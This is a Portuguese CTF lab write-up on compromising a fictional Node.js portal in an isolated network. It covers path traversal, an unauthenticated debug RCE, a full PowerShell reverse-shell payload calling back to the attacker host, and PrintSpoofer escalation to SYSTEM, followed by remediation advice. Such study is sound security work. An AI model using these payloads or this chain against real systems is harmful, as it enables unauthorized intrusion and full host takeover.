# CorpWeb — Writeup

![Dificuldade](https://img.shields.io/badge/dificuldade-f%C3%A1cil%2Fm%C3%A9dia-yellow)
![Plataforma](https://img.shields.io/badge/plataforma-Windows%2010-blue)
![Categoria](https://img.shields.io/badge/categoria-Web%20%2B%20Privilege%20Escalation-informational)

Writeup de um CTF local (laboratório isolado) envolvendo exploração de uma aplicação web vulnerável e escalação de privilégio no Windows, até a obtenção de `NT AUTHORITY\SYSTEM`.

> **Nota:** laboratório fictício (CorpTech Tecnologia Ltda. — Portal CorpWeb), executado em ambiente isolado (VirtualBox, rede Host-only). Nomes de host/usuário capturados são específicos do laboratório e não representam dados reais.

## Sumário

- [Escopo e metodologia](#escopo-e-metodologia)
- [1. Reconhecimento](#1-reconhecimento)
- [2. Enumeração da aplicação](#2-enumeração-da-aplicação-porta-8080)
- [3. Path Traversal → leitura do código-fonte](#3-path-traversal--leitura-do-código-fonte)
- [4. RCE não autenticado](#4-rce-não-autenticado)
- [5. Foothold — Shell reversa](#5-foothold--shell-reversa)
- [6. Escalação de privilégio — SYSTEM](#6-escalação-de-privilégio--system)
- [7. Flag](#7-flag)
- [Causas raiz e recomendações](#causas-raiz-e-recomendações)

---

## Escopo e metodologia

**Objetivo:** avaliar a segurança do Portal CorpWeb, partindo de um cenário de *black-box* (sem credenciais ou acesso prévio), com meta de obter o maior nível de privilégio possível no host e demonstrar impacto através da leitura de um arquivo de prova de conceito (`flag.txt`) na área restrita do Administrador.

**Ambiente:** máquina alvo isolada em laboratório (rede Host-only), executada via VirtualBox.

**Metodologia:** condução manual, seguindo as etapas clássicas de uma avaliação ofensiva — reconhecimento, enumeração, exploração, pós-exploração e escalação de privilégio — sem uso de scanners automatizados de exploração.

**Ferramentas:** Nmap, cURL, PowerShell (shell reversa artesanal), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

| Etapa | Técnica |
|---|---|
| Reconhecimento | ARP/ICMP scan + enumeração de portas |
| Acesso inicial | Path Traversal (LFI) |
| Execução remota | RCE não autenticado |
| Pós-exploração | Shell reversa (PowerShell) |
| Escalação de privilégio | Abuso de `SeImpersonatePrivilege` (PrintSpoofer) |

---

## 1. Reconhecimento

Varredura da rede local (Host-only) para identificar o host alvo:

```bash
sudo nmap -sn 192.168.56.0/24
```

```
Nmap scan report for 192.168.56.1
Host is up.
Nmap scan report for 192.168.56.100
Host is up.
Nmap scan report for 192.168.56.102
Host is up.
Nmap scan report for 192.168.56.101
Host is up.
```

Identificado o alvo em `192.168.56.102` (confirmado por varredura de portas — `.100` não tinha nenhum serviço ativo, era apenas ruído de rede).

Varredura completa de portas:

```bash
sudo nmap -p- --min-rate 1600 -T4 -Pn 192.168.56.102
```

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
8080/tcp  open  http-proxy
49664-49670/tcp open  unknown (RPC dinâmico)
```

Detecção de versão nas portas web:

```bash
nmap -sC -sV -p 80,443,8080 192.168.56.102
```

```
80/tcp   open  http       Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
443/tcp  open  ssl/http   Apache httpd 2.4.58 (certificado expirado desde 2019)
8080/tcp open  http-proxy CorpWeb/1.0.3 (Node.js)
|_http-title: CorpWeb - Portal Interno
```

**Por que a 8080, e não 80/443:** as portas 80 e 443 respondiam com um Apache genérico, título "Web Server" e um certificado SSL expirado desde 2019 — nada específico da aplicação avaliada. Já a porta 8080 respondia com um banner próprio (`CorpWeb/1.0.3`) e um título identificável, indicando ser a aplicação real por trás do escopo do teste. Esse padrão — um serviço web "de fachada" ao lado da aplicação real em outra porta — é comum o suficiente para valer a pena desconfiar sempre que a porta óbvia (80/443) só entrega uma página padrão.

---

## 2. Enumeração da aplicação (porta 8080)

A página inicial expõe uma funcionalidade de visualização de documentos:

```
GET /file?name=readme.txt
GET /file?name=docs/manual.txt
GET /file?name=docs/changelog.txt
```

E um comentário deixado no HTML:

```html
<!-- TODO: remover rota /debug antes do go-live -->
```

```bash
curl -s "http://192.168.56.102:8080/file?name=readme.txt"
```

O conteúdo revelou a estrutura de diretórios do servidor:

```
C:\CorpWeb\
├── app\server.js   <- código-fonte do servidor Node.js
├── config.ini       <- configurações e credenciais
├── public\
├── docs\
└── logs\access.log
```

---

## 3. Path Traversal → leitura do código-fonte

O parâmetro `name` do endpoint `/file` não valida o caminho informado, permitindo sair da pasta `public\` (webroot da aplicação):

```bash
curl -s "http://192.168.56.102:8080/file?name=../app/server.js"
```

Trecho relevante do código-fonte obtido:

```js
var WEBROOT = 'C:\\CorpWeb\\public';
...
if (p === '/file' || p === '/view' || p === '/download') {
    var fn = q.name || q.file || q.path || q.doc;
    ...
    res.end(fs.readFileSync(path.join(WEBROOT, fn)));
}
```

`path.join` concatena o valor do usuário sem sanitização, possibilitando LFI via `../`.

---

## 4. RCE não autenticado

O mesmo código-fonte revelou uma rota de depuração sem qualquer autenticação:

```js
if (p === '/debug/exec' || p === '/api/debug/run') {
    var cmd = q.cmd || q.command || q.c;
    ...
    var out = cp.execSync(cmd, {...});
}
```

Confirmação da execução de comando:

```bash
curl -s "http://192.168.56.102:8080/debug/exec?cmd=whoami"
```

```
desktop-654296k\webservice
```

---

## 5. Foothold — Shell reversa

Listener na máquina atacante:

```bash
rlwrap nc -lvnp 4444
```

`rlwrap` (*readline wrapper*) não é parte do `nc` — é um programa separado que "embrulha" outro programa de terminal e adiciona a ele edição de linha (setas, backspace, histórico). O `nc` sozinho, como listener de shell reversa, é bem cru: sem `rlwrap`, backspace e setas podem não funcionar direito. As flags `-l -v -n -p 4444` pertencem ao `nc` (listen, verbose, sem resolver DNS, porta 4444).

### O payload PowerShell

> **Alternativa mais rápida:** geradores online como o [revshells.com](https://www.revshells.com) montam esse mesmo payload automaticamente. Vale montar na mão pelo menos uma vez para entender o que está acontecendo — depois, usar um gerador é perfeitamente válido.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.56.101",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

É longo porque uma shell reversa em PowerShell não é um comando pronto do sistema (diferente do `nc -e /bin/bash` do Linux) — ela precisa ser **montada na mão** a partir de peças de rede e I/O:

1. **Abre uma conexão TCP** até a Kali (`TCPClient`) — é o alvo quem liga para o atacante ("reversa").
2. **Entra num laço (`while`)** lendo o que chega pela conexão.
3. **Executa o que foi lido com `iex`** (*Invoke-Expression*).
4. **Manda o resultado de volta**, simulando um prompt (`PS C:\caminho>`).

### Por que Base64 em vez de mandar o script direto

O comando precisa passar por duas camadas que distorcem texto: a URL do `curl` e o parser de argumentos do PowerShell/cmd.exe. O script usa aspas, cifrão, parênteses e pipes — caracteres especiais que quebrariam no caminho. A solução é converter o script inteiro em Base64 e usar a flag `-enc`, que decodifica e executa diretamente.

Detalhe técnico: o PowerShell espera esse Base64 em **UTF-16LE** — por isso `iconv -t utf-16le` antes do `base64`, não um Base64 comum de UTF-8.

Geração do payload (na Kali):

```bash
echo -n '<script acima>' | iconv -t utf-16le | base64 -w 0
```

Disparo via o RCE:

```bash
curl -s "http://192.168.56.102:8080/debug/exec?cmd=powershell%20-nop%20-enc%20<BASE64>"
```

Shell interativa obtida:

```
PS C:\CorpWeb\app> whoami
desktop-654296k\webservice
```

---

## 6. Escalação de privilégio — SYSTEM

Enumeração de privilégios do usuário atual:

```powershell
whoami /priv
```

```
Nome de privilégio            Descrição                                 Estado
============================= ========================================= ==========
SeImpersonatePrivilege        Representar um cliente após autenticação  Ativada
SeChangeNotifyPrivilege       Ignorar a verificação completa            Ativada
```

`SeImpersonatePrivilege` ativo indica vulnerabilidade a ataques da família **"Potato"**.

**Por que esse privilégio é perigoso:** ele existe para que serviços legítimos possam "vestir a identidade" de um cliente que se conecta neles. As ferramentas "Potato" abusam disso forçando um componente privilegiado do Windows (o spooler de impressão, no caso do PrintSpoofer) a se autenticar no processo do atacante. Como esse componente roda como SYSTEM, o atacante consegue "representá-lo" — e herda o nível de privilégio dele.

Versão do sistema:

```powershell
systeminfo
```

```
Nome do sistema operacional:   Microsoft Windows 10 Pro
Versão do sistema operacional: 10.0.19045
```

Windows 10 Pro build 19045 → compatível com **PrintSpoofer**.

### Obtendo e transferindo a ferramenta

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 8000
```

**Por que `Invoke-WebRequest` e não `certutil` ou `wget`:** `wget` no PowerShell moderno é só um alias para `Invoke-WebRequest`; `certutil -urlcache` é um LOLBin (ferramenta nativa usada para fim não previsto), útil sem PowerShell disponível. Como já estávamos em uma sessão PowerShell, `Invoke-WebRequest` foi a opção mais direta.

```powershell
Invoke-WebRequest -Uri http://192.168.56.101:8000/PrintSpoofer64.exe -OutFile C:\Windows\Temp\PrintSpoofer64.exe
```

```
    Diretório: C:\Windows\Temp

Mode    LastWriteTime        Length Name
----    -------------        ------ ----
-a----  28/10/2026 22:16      27136 PrintSpoofer64.exe
```

### Execução — lançando uma segunda shell já como SYSTEM

```powershell
C:\Windows\Temp\PrintSpoofer64.exe -c "powershell -nop -enc <BASE64_PORTA_4445>"
```

Confirmação, na nova shell (porta 4445):

```powershell
whoami
```

```
nt authority\system
```

---

## 7. Flag

```powershell
dir "C:\Users\Administrator\Desktop"
```

```
    Diretório: C:\Users\Administrator\Desktop

Mode    LastWriteTime        Length Name
----    -------------        ------ ----
-a----  03/09/2026 10:26          46 flag.txt
```

```powershell
Get-Content "C:\Users\Administrator\Desktop\flag.txt"
```

Flag capturada com sucesso, confirmando o comprometimento total do host.

---

## Causas raiz e recomendações

### Achado 1 — Path Traversal / Local File Inclusion (CWE-22)

**Severidade:** Alta · **Localização:** `GET /file?name=<arquivo>`

**Causa raiz:** o parâmetro `name` é concatenado ao diretório base (`WEBROOT`) via `path.join()` sem normalização nem validação de limites, permitindo `../` para acessar arquivos fora do diretório público.

**Impacto:** divulgação de informações sensíveis (código-fonte, configurações), que viabilizou o Achado 2.

**Recomendação:**
- Resolver o caminho absoluto (`path.resolve`) e validar que permanece dentro do `WEBROOT`.
- Preferir *allowlist* de nomes de arquivo em vez de aceitar qualquer caminho.
- Rejeitar explicitamente `..` e caminhos absolutos.

### Achado 2 — Execução Remota de Código não autenticada (CWE-78 / CWE-306)

**Severidade:** Crítica · **Localização:** `GET /debug/exec?cmd=<comando>`

**Causa raiz:** rota de depuração deixada acessível publicamente, sem autenticação, repassando entrada de usuário direto a `child_process.execSync()`.

**Impacto:** controle total do servidor por qualquer agente não autenticado na rede.

**Recomendação:**
- Remover rotas de depuração antes de qualquer deploy (o próprio código já tinha um `TODO` reconhecendo o risco).
- Se indispensável, proteger com autenticação forte, autorização por perfil e segregação de rede.
- Nunca repassar entrada de usuário a `exec`/`execSync`; usar *allowlist* rígida quando inevitável.
- Gate de segurança em CI/CD para barrar rotas de debug em produção.

### Achado 3 — Escalação de Privilégio via SeImpersonatePrivilege (CWE-269)

**Severidade:** Alta · **Localização:** conta de serviço `webservice`

**Causa raiz:** conta de serviço com `SeImpersonatePrivilege` habilitado além do necessário, explorável pela família "Potato".

**Impacto:** escalação de privilégio local até `NT AUTHORITY\SYSTEM`.

**Recomendação:**
- Princípio do menor privilégio: remover `SeImpersonatePrivilege` de contas que não o exigem.
- Considerar *Virtual Account*/*Protected Process* com escopo reduzido.
- Monitorar via EDR/SIEM execução de binários "Potato" e chamadas de *impersonation*.
- Desabilitar o serviço de spooler de impressão em servidores que não o utilizam.

### Síntese

A cadeia completa foi viabilizada pela combinação de três falhas independentes — qualquer uma delas, corrigida isoladamente, teria interrompido o ataque. Prioridade para o **Achado 2** (RCE não autenticado), maior impacto imediato.

---

## Disclaimer

Laboratório de estudo, executado em ambiente isolado e autorizado. As técnicas aqui descritas não devem ser aplicadas contra sistemas sem autorização explícita.
